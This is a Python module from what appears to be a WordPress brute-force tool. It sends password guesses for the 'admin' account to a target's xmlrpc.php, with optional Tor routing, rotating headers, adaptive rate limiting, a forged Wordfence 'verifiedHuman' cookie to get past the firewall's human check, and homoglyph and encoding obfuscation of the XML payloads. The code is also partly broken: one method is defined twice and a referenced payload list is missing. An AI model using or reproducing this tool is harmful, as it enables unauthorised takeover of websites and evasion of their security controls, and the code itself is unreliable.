# wordpress_bruteforce/modules/auth.py
import asyncio
import random
import xml.etree.ElementTree as ET
from aiohttp import ClientSession, TCPConnector
from aiohttp_socks import ProxyConnector
from fake_useragent import UserAgent
from .headers import HeaderManager
from .logging import Logger
from .utils import print_colored_bold
import time

class BruteForce:
    """Advanced brute force class with Wordfence evasion"""

    def __init__(self, target_url, use_tor=False):
        self.target_url = target_url
        self.use_tor = use_tor
        self.logger = Logger()
        self.rate_limit_delay = 1  # Initial delay in seconds
        self.consecutive_errors = 0
        self.max_retries = 5
        self.session = self._create_session()
        self.request_history = []  # Track timestamps of recent requests
        self.max_rpm = 120         # Max requests per minute
        self.error_threshold = 5   # Max consecutive errors before slowdown
    
    async def _make_request(self, password):
        """Smart rate limiting based on server behavior"""
        # Calculate request window
        now = time.time()
        self.request_history = [t for t in self.request_history if t > now - 60]

        # Dynamic delay calculation
        if len(self.request_history) >= self.max_rpm:
            sleep_time = 60 / (self.max_rpm - len(self.request_history))
            await asyncio.sleep(max(1, sleep_time))
        
        self.request_history.append(now)


    def _create_session(self):
        """Create session with rotating headers"""
        return ClientSession(
            connector=(
                ProxyConnector.from_url("socks5://127.0.0.1:9050")
                if self.use_tor
                else TCPConnector(limit=100)
            ),
            headers=HeaderManager(self.target_url).generate(),
        )

    async def execute_attack(self, passwords):
        """Execute attack with dynamic rate limiting"""
        try:
            for password in passwords:
                await self._make_request(password)
                await asyncio.sleep(self.rate_limit_delay)
                yield None
        finally:
            await self.session.close()

    async def _make_request(self, password):
        """Make request with retry logic"""
        for attempt in range(self.max_retries):
            try:
                async with self.session.post(
                    f"{self.target_url}/xmlrpc.php",
                    data=self._build_payload("admin", password),
                    timeout=30,
                ) as response:
                    return await self._handle_response(response, password)
            except Exception as e:
                self._adjust_rate_limit(str(e))
                await asyncio.sleep(2**attempt)  # Exponential backoff

    async def _handle_response(self, response, password):
        """Handle server response with WAF detection"""
        if "wordfence_verifiedHuman" in response.cookies:
            print_colored_bold("🛡️ Wordfence human verification detected!", "yellow")
            await self._solve_challenge(response)
            return False

        response_text = await response.text()

        # Handle rate limiting
        if response.status == 429 or response.status == 503:
            retry_after = int(response.headers.get("Retry-After", 60))
            print_colored_bold(f"⏳ Rate limited. Waiting {retry_after}s...", "yellow")
            await asyncio.sleep(retry_after)
            return False

        # Handle successful response
        if response.status == 200 and self._is_success(response_text):
            self.logger.log_success("admin", password)
            return True

        # Reset rate limit on successful request
        self.consecutive_errors = 0
        self.rate_limit_delay = max(0.5, self.rate_limit_delay * 0.9)
        return False

    async def _solve_challenge(self, response):
        """Simulate human verification"""
        # Set verification cookie
        self.session.cookie_jar.update_cookies({
            "wordfence_verifiedHuman": "1"
        })
        # Resend original request
        await asyncio.sleep(2)
        await self.session.get(str(response.url))

    def _adjust_rate_limit(self, error_msg):
        """Dynamically adjust rate limiting based on errors"""
        self.consecutive_errors += 1
        self.rate_limit_delay = min(10, 0.5 * (2**self.consecutive_errors))
        if "Timeout" in error_msg:
            print_colored_bold("⌛ Timeout detected, slowing down...", "yellow")

    def _build_payload(self, username, password):
        """Generate obfuscated payloads"""
        obfuscation_techniques = [
            lambda x: x.replace("methodName", "m\u0435thodN\u0430me"),  # Unicode homoglyphs
            lambda x: x.replace("<string>", "<str\u0438ng>"),           # Cyrillic 'i'
            lambda x: '<?xml version="1.1" ?>' + x,                     # XML 1.1 declaration
            lambda x: x.replace(" ", "\t"),                             # Tab indentation
            lambda x: '<!--' + 'a'*random.randint(10,50) + '-->' + x,   # Random comments
            lambda x: x.encode('utf-16').decode('latin-1')              # Encoding mismatch
        ]

        base_payload = random.choice(self.PAYLOADS)
        payload = base_payload.format(username=username, password=password)

        # Apply random obfuscations
        for _ in range(random.randint(0, 3)):
            payload = random.choice(obfuscation_techniques)(payload)

        return payload

    async def cleanup(self):
        """Proper resource cleanup"""
        await self.session.close()
